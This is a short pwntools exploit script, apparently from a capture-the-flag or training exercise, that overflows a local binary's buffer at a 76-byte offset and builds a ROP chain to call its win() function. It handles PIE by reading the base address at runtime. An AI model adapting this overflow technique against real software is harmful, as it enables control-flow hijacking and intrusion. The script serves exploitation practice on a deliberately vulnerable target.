#!/usr/bin/env python3

import sys
from pwn import *
from itertools import cycle

elf = ELF("./example")

with elf.process() as p:
    # To compensate for PIE, we must know the offset at runtime.
    base_address = p.libs()['/app/example']
    # Then, we ensure our functions are offset by that amount.
    elf.address = base_address

# Now, we can create our attack.
## --------------

rop = ROP(elf)
rop.win()


offset = 76 # This needs to be the offset for eip

## --------------

payload = flat({
    offset: rop.chain()
})

print("ropchain:")
print(rop.dump())
print("payload:")
print(rop.chain())

with elf.process([payload]) as p:
    p.interactive()

